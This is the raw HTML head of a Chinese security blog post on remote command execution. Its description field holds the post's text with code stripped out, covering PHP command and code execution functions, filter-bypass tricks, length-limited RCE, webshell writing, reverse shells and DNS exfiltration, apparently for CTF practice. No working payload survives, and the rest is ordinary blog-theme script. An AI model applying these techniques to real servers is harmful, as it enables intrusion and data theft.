<!DOCTYPE html><html lang="zh-CNs" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>远程命令执行 | VV</title><meta name="keywords" content="web,后端漏洞"><meta name="author" content="VVkladg0r"><meta name="copyright" content="VVkladg0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="远程命令执行"><meta name="application-name" content="远程命令执行"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="远程命令执行"><meta property="og:url" content="http://cszvvds.cc/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html"><meta property="og:site_name" content="VV"><meta property="og:description" content="RCERCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统 后端漏洞 原理一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用"><meta property="og:locale" content="zh-CNs"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="VVkladg0r"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="RCERCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统 后端漏洞 原理一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://cszvvds.cc/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"VV:QAQ","backTitle":"VV!"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: VVkladg0r","link":"链接: ","source":"来源: VV","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'VV',
  title: '远程命令执行',
  postAI: '',
  pageFillDescription: 'RCE, 原理, 系统命令执行函数, 代码执行函数, 绕过, 管道符, 空格过滤, 关键字过滤, 其他绕过, cat替换命令, 回溯绕过, 函数绕过, 嵌套绕过, 分号绕过, 数组绕过, 取反绕过, 异或绕过, 或绕过, 自增绕过, 输出重定向：, 无字母数字RCE, 例1：, 思路, 法1, 法2, 法3, 例2(进阶)：, PHP7下简单解决, PHP5下理解, PHP5下思考, PHP5+shell打破禁锢, 深入理解glob通配符, 构造POC 执行任意命令, 限制长度RCE, 15字符下可控, 7字符下可控, 5字符下可控, 法1, 法2, 4字符下可控, 法1, 法2, 3字符下可控, 无回显RCE, 法1, 法2, 法3, 法4, 无参数RCE, 核心代码, 利用方式, 法1, 法2, 法3, 法4, localeconv(), scandir(), current(pos), dirname()和chdir(), array_reverse(), highlight_file()漏洞可以让攻击者直接向后台服务器远程注入操作系统命令或者代码从而控制后台系统后端漏洞原理一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器防火墙入侵检测等设备的管理界面上一般会给用户提供一个操作的界面用户从界面输入目标提交后后台会对该地址进行一次测试并返回测试结果如果设计者在完成该功能时没有做严格的安全控制则可能会导致攻击者通过该接口提交意想不到的命令从而让后台进行执行从而控制整个后台服务器现在很多的企业都开始实施自动化运维大量的系统操作会通过自动化运维平台进行操作在这种平台上往往会出现远程系统命令执行的漏洞远程代码执行同样的道理因为需求设计后台有时候也会把用户的输入作为代码的一部分进行执行也就造成了远程代码执行漏洞不管是使用了代码执行的函数还是使用了不安全的反序列化等等因此如果需要给前端用户提供操作类的接口一定需要对接口输入的内容进行严格的判断比如实施严格的白名单策略会是一个比较好的方法在应用开发中为了灵活性简洁性等会让应用调用代码执行函数或系统命令执行函数处理若应用对用户的输入过滤不严容易产生远程代码执行漏洞或系统命令执行漏洞系统命令执行函数能将字符串作为命令执行且返回命令执行结果能将字符串作为命令执行只调用命令不返回任何结果但把命令的运行结果原样输出到标准输出设备上能将字符串作为命令执行能将字符串作为命令执行但是只返回执行结果的最后一行约等于无回显能将字符串作为命令执行打开进程文件指针与类似在当前进程空间执行指定程序代码执行函数将字符串作为代码执行将字符串作为代码执行正则匹配替换字符串主要创建匿名函数回调函数第一个参数为函数名第二个参数为函数的参数回调函数第一个参数为函数名第二个参数为函数参数的数组可变函数若变量后有括号该变量会被当做函数名为变量值前提是该变量值是存在的函数名的函数执行绕过管道符管道符实例描述无论真假与都执行无论真假与都执行为真时才执行否则只执行显示的执行结果为假时才执行否则只执行管道符实例描述显示的执行结果为假时才执行否则只执行无论真假与都执行为真时才执行否则只执行空格过滤以下可代替空格即即在下表示分隔符但是如果单纯的解释器会把整个当做变量名所以导致输不出来结果因此这里加一个就固定了变量名同理在后面加个可以起到截断的作用使用是因为它是当前系统进程的第九个参数的持有者它始终为空字符串关键字过滤比如说禁用了等绕过单引号绕过双引号绕过特殊变量绕过变量拼接读过滤以下变量名中的第一个非法字符会被替换为下划线标签过滤等价于等价于编码绕过可以使用各种编码进行绕过编码绕过编码反引号用于执行系统命令编码绕过编码用于执行系统命令编码十六进制编码正则匹配的绕过其他绕过替换命令与相反按行反向输出按页显示用于文件内容较多且不能滚动屏幕时查看文件与类似查看文件末几行查看文件首几行在查看文件的基础上显示行号以二进制方式读文件转人可读字符以二进制方式读文件同时有可读字符显示排序文件报告或删除文件的重复行报错文件内容过滤查找字符串回溯绕过正则的回溯次数大于次时返回函数绕过将报文头信息转为数组返回将数组当前元素返回默认指向第一个元素因此我们只需在报文头最前面添加一个执行命令即可例如等于该命令会显示根目录下的文件查看上级目录来查看当前文件名读根目录匹配任意文件匹配以为后缀的文件所以也可以使用嵌套绕过还有的形式伪协议的嵌套分号绕过假如过滤分号那么可以直接闭合闭合的是里面的语句后续还有语句的话依旧是会执行的除此以外代码最后一句可以不用加分号可以绕过分号的过滤如下面代码所示数组绕过遇到数组会直接返回取反绕过取反符号用的字符不会触发正则表达式取反传参输出得到取反传参内容在命令行中运行例如果要绕过正则我们可以采用取反绕过如这里还利用了一点是对于形如其中可以是字符串会执行这个这里相当于执行了但是上述代码取反后应该是并不是正常的所以如果直接执行是不会被执行的当被当作代码执行时的第一步就是取反操作但是取反得到的字符串并不会被当作代码执行因为在取反之前解释器并不知道这原来是所以对于已知过滤条件想要执行我们指定的代码必须有这样的形式那么想用蚁剑这样的工具的话需要让其执行我们提交的数据由问题可以知道若构造这样是不能得到执行结果的以这样的形式去执行构造但是也是执行不成功原因第一层首先先会执行取反函数得到第二层注意第二个括号里其实还是字符串并不是真正的代码在解释的时候会找到名为的函数会把变成真正的代码也就是说现在可以传参过来了但是却没有执行那么要想要执行还要在在前面追加一个可以执行第一层首先先会执行取反函数得到第二层将字符串看作代码执行第三层将传来的数据看作代码执行异或绕过在中两个字符串异或之后得到的还是一个字符串原理是转换为二进制进行异或如果正则匹配过滤了字母和数字那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行异或从而得到我们想要的字符串异或是一种逻辑运算它的原理如下符号表示异或运算用符号表示定义对于两个二进制位如果相应位相同则结果为如果相应位不同则结果为下面是异或运算的真值表对于整个二进制数异或运算会对每一位进行独立的操作异或的性质交换律等于结合律等于自反性等于零元素等于异或构造脚本输入异或构造的字符串异或脚本输出根据题目给的正则表达式修改即可先用该脚本生成所有字符异或后的结果用于下一个脚本的使用命令行运行根据题目给的正则表达式修改即可都是异或脚本例简单例题再中需要执行命令构造字符串异或结果为或绕过原理和异或绕过类似只不过用的是运算符正则过滤的内容自增绕过在编程中自增操作是指将一个变量的值增加自增操作输出自增操作也可以应用于字母自增操作输出所以我们只要能拿到一个变量其值为通过自增操作即可获得中所有字符那么如何拿到一个值为字符串的变量呢巧了数组的第一个字母就是大写而且第个字母是小写也就是说我们可以同时拿到小写和大写等于我们就可以拿到和的所有字母测试发现以上版本不可使用使用时需要编码下固定格式构造出来的然后传入一样的得到得到没有定义默认为也即此时得到此时得到此时得到此时得到此时得到此时得到此时得到此时得到此时输出重定向可以写马无字母数字工具例异或取反自增临时文件上传都可以思路首先明确思路我的核心思路是将非字母数字的字符经过各种变换最后能构造出中任意一个字符然后再利用允许动态函数执行的特点拼接处一个函数名如然后动态执行之即可那么变换方法将是解决本题的要点不过在此之前我需要说说和的差异中是一个函数我们可以通过这样的方法来动态执行任意代码但中不再是函数变成了一个语言结构类似不能再作为函数名动态执行代码所以利用起来稍微复杂一点但也无需过于担心比如我们利用函数同样可以用来下文为了方便起见使用作为环境法这是最简单最容易想到的方法在中两个字符串执行异或操作以后得到的还是一个字符串所以我们想得到中某个字母就找到某两个非字母数字的字符他们的异或结果是这个字母即可其实很像自增的感觉法取反用的是编码的某个汉字并将其中某个字符取出来比如和的结果是其取反即为字母瞰和和的半始俯瞰次站这个答案还利用了的弱类型特性因为要获取和就必须有数字而由于弱类型这个特性的值为故也就是法自增也就是说所以我们只要能拿到一个变量其值为通过自增操作即可获得中所有字符在中如果强制连接数组和字符串的话数组将被转换成字符串其值为再取这个字符串的第一个字母就可以获得了例进阶根据上题其中有两个主要的思路利用位运算利用自增运算符相较于正常的上面的无字母数字这道题多了两个限制长度不超过位除了不包含字母数字还不能包含和因为不能使用了所以我们无法构造中的变量所以上述方法无法进行所以这里其实有一种新方法这里重点说一下临时文件上传下简单解决我们将上述代码放在中然后执行启动一个的服务器中修改了表达式执行的顺序前是不允许用这样的方法来执行动态函数的但中增加了对此的支持所以我们可以通过来执行函数第一个括号中可以是任意表达式所以很简单了构造一个可以生成这个字符串的表达式即可如下不可见字符用编码表示下理解下思考我们使用来运行一个的环境此时我们尝试用的将会得到一个错误原因就是并不支持这种表达方式大部分语言都不会是单纯的逻辑语言一门全功能的语言必然需要和操作系统进行交互操作系统里包含的最重要的两个功能就是系统命令和文件系统很多木马与远控其实也只实现了这两个功能自然也能够和操作系统进行交互反引号就是中最简单的执行的方法那么在使用无法解决问题的情况下为何不考虑用反引号的方式来呢打破禁锢因为反引号不属于字母数字所以我们可以执行系统命令但问题来了如何利用无字母数字的系统命令来好像问题又回到了原点无字母数字在中仍然是一个难题此时我想到了两个有趣的知识点下可以利用来执行任意脚本文件名支持用通配符代替或者叫它的作用和一样就是用当前的执行一个文件中的命令比如当前运行的是则的意思就是用执行文件中的命令用执行文件是不需要有权限的那么如果目标服务器上有一个我们可控的文件那不就可以利用来执行它了吗这儿主要介绍中的两个参数是否允许上传是默认的临时文件的保存目录默认为这个文件也很好得到我们可以发送一个上传文件的包此时会将我们上传的文件保存在临时文件夹下默认的文件名是文件名最后个字符是随机的大小写字母第二个难题接踵而至执行也是有字母的此时就可以用到下的通配符可以代替个及以上任意字符可以代表个任意字符那么就可以表示为或但我们尝试执行却得到如下错误这是因为能够匹配上这个通配符的文件有很多我们可以列出来可见我们要执行的排在倒数第二位然而在执行第一个匹配上的文件即的时候就已经出现了错误导致整个流程停止根本不会执行到我们上传的文件思路又陷入了僵局虽然方向没错深入理解通配符大部分同学对于通配符可能知道的都只有和但实际上阅读的文档可以学到更多有趣的知识点其中支持用的方法来构造这个位置不是字符那么我们用这个姿势干掉排除了第个字符是的文件同样我们可以排除包含的文件现在就剩最后三个文件了但我们要执行的文件仍然排在最后但我发现这三个文件名中都不包含特殊字符那么这个方法似乎行不通了继续阅读的帮助发现另一个有趣的用法就跟正则表达式类似支持利用来表示一个范围我们再来看看之前列出可能干扰我们的文件所有文件名都是小写只有生成的临时文件包含大写字母那么答案就呼之欲出了我们只要找到一个可以表示大写字母的通配符就能精准找到我们要执行的文件翻开码表可见大写字母位于与之间那么我们可以利用来表示大写字母显然这一招是管用的构造执行任意命令当然生成临时文件名是随机的最后一个字符不一定是大写字母不过多尝试几次也就行了最后我传入的为发送数据包如下成功执行任意命令除这些之外我们还可以这样用其中为构造出的适合于过滤了引号的情况下使用限制长度字符下可控因为只能传入个字符但是没有限制命令执行的次数所以我们的思想可以通过下的符号与符号写入一段一句话木马到指定文件经测试上述这样的一句话木马经过换行是可以命令执行的所以我们可以通过传参构造出这样的一句话木马不断传入以下字符下可控我们可以使用来生成文件然后将生成的文件名拼凑成一句命令最后执行达到目的替换将内容写入到文件中是指换行将文件按时间排序输出命令可以从一个文件中读取命令来执行同理和类似于即直接创建文件通过来将命令执行结果写入文件会覆盖掉文件原本的内容创建文件并把字符串写入到文件里用来追加内容在文件末尾追加字符串命令按时间顺序由近及远排序后创建的排在前面只能精确到秒由此按时间顺序反向依次创建文件再通过创建文件并把执行结果写入文件里实际上在创建文件时加入把命令连接起来中可以用使指令连接下一行这样就可以写多行命令了文件中前面命令出错会自动跳过不影响后面命令的执行脚本的执行方式通常有如下三种或者或者或者推荐用第一种第三种第二种要文件有执行权限故不推荐上面不是吗查看后发现都写进去了然后可以执行脚本可以发现确实符合第四条文件中前面命令出错会自动跳过不影响后面命令的执行可以发现最长的长度就是了上点难度假如要执行怎么办写入语句编码后需要被执行的语句脚本检查是否攻击成功攻击完成后就会生成文件注这里用的是不是一句话木马不能用蚁剑链接可能改成就行了不过没有尝试命令里的空格或者其他特殊字符一定要转义字符下可控与字符下可控一样主要思路是缩短这一步骤的长度把这条命令拆分到各个文件中去法拼接字符串写入一句话前面可以拆成更小的需要单独拆分出来拆分方法同理输入通配符会把第一个列出的文件名当作命令剩下的文件名当作参数通过来倒置输出内容命令将文件中的每行内容以字符为单位反序输出用来代替不换行输出将文件内容反向输出在用时写到时每个文件名都是单独一行等同于命令目的那么我们只需要将上面的代码拆分倒序输入到主机即可我们需要让先执行文件就会得到文件最后再让去执行文件即可得到最终如下脚本检查是否攻击成功然后蚁剑连接即可法反弹既然可以执行命令那么我们首先想到的是反弹一个回来我们在自己的上目录里先创建一个文件里面写好反弹的话由于文件名不能有斜杠所以就不能我们就用这样连上后会默认自动访问反弹反弹的命令如下的监听的端口空格需要转义构造空格就用去了五个字符我们的语句里面有两个空格而相同的文件名只能有一个因此这里不能直接执行反弹那么通过将反弹语句放在上然后通过如下方式来执行地址我们先在自己的新建一个文件内容为然后在上面监听端口因为的长度也大于所以要要把写入文件命令排序的规则是空格和符号最前数字其次字母最后那么我们再构造然后运行生成文件再执行脚本本脚本使用说明现有靶机攻击机两者均为对于靶机搭建环境拉取镜像启动退出并关闭对于攻击机开三个终端分别执行一个文件写入或执行命令开启服务第二第三个命令需要在同一个目录下执行温馨提示根据情况修改变量的值根据情况修改中的在执行该脚本的时候可通过进入靶机内部对应的题目目录下不断地执行命令来看传值的情况最终的结果应是秒左右能反弹成功不能反弹成功时尝试查看脚本是否有问题将写入文件根据自己情况更改在攻击机上开三个页面分别执行然后开始运行此文件大概等秒成功反弹到攻击机字符下可控法常规字符拼接写马输入统配符会把第一个列出的文件名当作命令剩下的文件名当作参数等同于命令虽然基本上和一样但有两个好处一是开头字母是这使得它在序中靠前二是按列输出不换行先看下的效果写到时每个文件名都是单独一行这样会影响命令执行看下的效果会不换行输出到文件中去可以反转文件每一行的内容增加字母来限定被用来当作命令和参数的文件名等同于命令通过增加的把文件大小显示成等形式参数来让调整根据时间排序参数的位置我们之后需要用到倒置输出所以需要列出这样形式的文件名所以要增加来把往前拉所以因为是四个字符所以肯定是不能用了看一下构造发现排在最前面表示执行并输出到中很巧妙这里这里目录下这么多文件只有能执行成功最后等同于命令等同于命令里面的内容位执行里面的内容法反弹脚本可用本脚本使用说明现有靶机攻击机两者均为对于靶机搭建环境拉取镜像启动退出并关闭对于攻击机开三个终端分别执行一个文件写入或执行命令开启服务第二第三个命令需要在同一个目录下执行温馨提示根据情况修改变量的值根据情况修改中的在执行该脚本的时候可通过进入靶机内部对应的题目目录下不断地执行命令来看传值的情况最终的结果应是秒左右能反弹成功不能反弹成功时尝试查看脚本是否有问题或退出并重启改将写入文件本质上执行命令注意根据情况修改攻击机结果字符下可控平台的难了一题只限个字符的依然利用通配符表示将下面的文件执行如果第一个是命令就直接执行命令后面的当参数与前几点的原理类似首先查看当前目录下有哪些文件只存在开头的和开头的文件中文件排序按照个英文字母顺序排放所以我们依然利用前几种字符限制的方法通过写入一个以命令名命名的文件如读取文件带上行八进制显示输出但这样的命令前提是其第一个字母必须在当前文件名中排到第一位或第二种接下来再传入的时候就会在源代码中得到无回显命令执行函数我用的是因为这个函数本身是没有回显的拿来做测试简直不能再合适法时间盲注逻辑和注入的时间盲注差不多相关命令秒之后返回结果逐行获取数据逐行获取一行字符命令逐列获取单个字符获取第一个字符获取第二个字符语句判断命令是否执行里的判断语句为真的话则执行休眠秒后返回结果直接脚本可用环境搭建靶机拉取镜像启动退出并关闭请输入例如样式请输入定义三个变量码表把码转换成字母编码变成字符定义读取行定义读取个字符把值加入输出显示两个脚本差不多法文件读写命令用于从标准输入读取数据并将其写入一个或多个文件的作用是把查询到的根目录写入到当前网页下的某文件再次访问该文件即可得到被打印的根目录通常后面会跟着要写入的文件名先执行命令将的结果重定向到文件名为的文件中还可以重定向符再访问然后就随便打了法反弹遇到这种无回显的命令执行很常见的一个思路是反弹因为它虽然不会将命令执行的结果输出在屏幕上但实际上这个命令它是执行了的那我们就将反弹到自己服务器上然后再执行命令肯定就可以看到回显了一般来讲我们反弹都用的这条命令但这里我不知道哪里出了问题在中可以成功反弹但放到命令执行中就反弹不了了所以说无奈之下我就只能使用进行反弹但其实这是很不实用的因为很多中都没有安装这里就先演示一下用反弹利用进行反弹可以看到已经反弹成功了拿到了根目录下的法外带数据法域名解析域名解析是把域名指向网站空间让人们通过注册的域名可以方便地访问到网站的一种服务地址是网络上标识站点的数字地址为了方便记忆采用域名来代替地址标识站点地址域名解析就是域名到地址的转换过程域名的解析工作由服务器完成域名解析也叫域名指向服务器设置域名配置以及反向登记等等说得简单点就是将好记的域名解析成服务由服务器完成是把域名解析到一个地址然后在此地址的主机上将一个子目录与域名绑定而如果我们发起请求的目标不是地址而是域名的话就一定会发生一次域名解析那么假如我们有一个可控的二级域名那么当它向下一层域名发起解析的时候我们就能拿到它的域名解析请求这就相当于配合请求完成对命令执行的判断这就称之为当然发起一个请求需要通过中的命令或者命令哈平台是临时的网址不常用了要注册也可以使用的还是这一段代码我们用分号作为命令的分隔符然后发起请求然后最后用反引号执行命令具体如下然后就可以到平台上取看到我们发起的请求了可以看到的结果也已经在上面显示了出来然后我们就尝试执行其它的命令比如像之类的但这里需要注意的一点是如果我们直接执行的话它只会返回第一条结果具体如下图所示那么为了让它显示出剩余的结果我们就需要用到的命令用命令就可以实现对行的完美划分这里利用题目不是很好演示我就直接用进行演示就像下图一样直接用就行还是很方便的通过控制多少就可以看到出的第多少个文件名这样就可以完成任意的命令执行了但是值得注意的是因为有的字符可能会无法显示或者只显示部分信息所以说执行命令的时候推荐使用编码然后再解开就好无参数无参就是说在无法传入参数的情况下仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果核心代码这里的正则表达式匹配了一个或多个非标点符号字符表示函数名后跟一个括号表示函数调用其中是递归引用它只能匹配和替换嵌套的函数调用而不能处理函数参数使用该正则表达式进行替换后每个函数调用都会被删除只剩下一个分号而最终结果强等于时才能进行下一步简而言之无参数就是不使用参数而只使用一个个函数最终达到目的利用方式无参数可能用到的函数目录操作函数返回当前工作目录函数返回指定目录中的文件和目录的数组函数返回路径中的目录部分函数改变当前的目录数组相关的操作将内部指针指向数组中的最后一个元素并输出将内部指针指向数组中的下一个元素并输出将内部指针指向数组中的上一个元素并输出将内部指针指向数组中的第一个元素并输出返回当前元素的键名和键值并将内部指针向前移动删除数组中第一个元素并返回被删除元素的值逆转数组交换数组中的键和值成功时返回交换后的数组如果失败返回从数组中随机取出一个或多个单元如果只取出一个默认为返回随机单元的键名否则就返回包含随机键名的数组完成后就可以根据随机的键获取数组的随机值和配合使用可随机返回当前目录下的文件名读文件对文件进行语法高亮显示输出一个文件对文件进行语法高亮显示把整个文件读入一个字符串中可用于读取非格式的文件关键函数获取环境变量的值以下返回以上正常回显获取所有请求标头是的别名函数但是该函数只能在环境下使用以上返回由所有已定义变量所组成的数组会返回全局变量的值返回数组顺序为返回数组中的当前单元初始指向插入到数组中的第一个单元也就是会返回变量的数组值利用全局变量进函数返回数组中的当前元素的值该函数是函数的别名启动新会话或者重用现有会话成功开始会话返回反之返回返回参数给获取设置当前会话返回当前会话如果当前没有会话则返回空字符串文件读取法这个函数的作用是获取所有的头部信息也就是然后我们可以用把它打印出来但这个有个限制条件就是必须在的环境下可以使用其它环境都是用不了的我们到中去做演示测试代码如下可以看到所有的头部信息都已经作为了一个数组打印了出来但我们在实际的利用过程中并用不了这么多的我们需要有选择的执行一些命令这里就需要用到中操纵数组的函数了这里常见的是利用函数取出最后一位并且只会取值不会取键所以键名随便取结合上面一些其他相关函数即可实现命令执行都要传法是有局限性的因为如果中间件不是的话它就用不了了那我们就介绍一种更为普遍的方法这种方法其实和上面那种方法原理是差不多的可以看到它并不是获取的而是获取的四个全局变量而它的返回值是一个二维数组我们利用方式传入的参数在第一个数组中这里我们就需要先将二维数组转换为一维数组这里我们用到函数这个函数的作用是返回数组中的当前单元而它的默认是第一个单元也就是我们方式传入的参数我们可以看看实际效果这里可以看到成功输出了我们二维数组中的第一个数据也就是将的数据全部输出了出来相当于它就已经变成了一个一维数组了那按照我们上面的方法我们就可以利用函数以字符串的形式取出最后的值然后直接执行就行了这里和上面就是一样的了那我们把改成即可执行我们的代码那同样也能执行命令总结一下这种方法和第一种方法几乎是一样的就多了一步就是利用函数将二维数组转换为一维数组法简单来说就是把恶意代码写到的中然后利用这个函数去读取它返回一个字符串然后我们就可以用去直接执行了这里有一点要注意的就是要开启才能用所以说要先这里我们先试着把的值取出来直接出来就是字符串那就非常完美我们就不用去做任何的转换了但这里要注意的是中只能有所以说我们要先将恶意代码进制编码以后再插入进去而在中将进制转换为字符串的函数为那我们就可以开始构造了首先把的值替换成这个然后在前面把换成就可以成功执行了同时我们还要加上函数法函数直接读取文件上面我们一直在想办法在进行但有的情况下确实无法进行时我们就要想办法直接利用函数完成对目录以及文件的操作接下来我们就来介绍这些函数函数返回一个包含本地数字及货币格式信息的数组我们在代码中将的返回结果输出出来它返回的是一个二维数组而它的第一位居然是一个点那按照我们上面讲的是可以利用函数将这个点取出来的但这个点有什么用呢点代表的是当前目录我们可以利用这个点完成遍历目录的操作相当于就是中的我们利用函数把这个点取出来完成目录遍历操作函数返回指定目录中的文件和目录的数组函数是函数的别名两者是一样的函数返回数组中的当前元素单元每个数组中都有一个内部的指针指向它当前的元素初始指向插入到数组中的第一个元素和这个函数是用来跳目录的有时想读的文件不在当前目录下就用这个来切换因为会将这个目录下的文件和目录都列出来那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用切就好了如果要向上跳就要构造首先我们可以利用获取当前目录那么怎么进行当前目录的目录遍历呢这里用即可那么既然不在这一层目录如何进行目录上跳呢我们用即可那么怎么更改我们的当前目录呢这里我们发现有函数可以更改当前目录将的当前目录改为所以我们这里在进行如下设置即可我们尝试读取即可进行文件读取函数将原数组中的元素顺序翻转创建新的数组并返回将整个数组倒过来有的时候当我们想读的文件比较靠后时就可以用这个函数把它倒过来就可以少用几个取文件的打印输出或者返回文件中语法高亮版本的代码相当于就是用来读',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-13 08:43:39',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 5 || hour >= 5
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
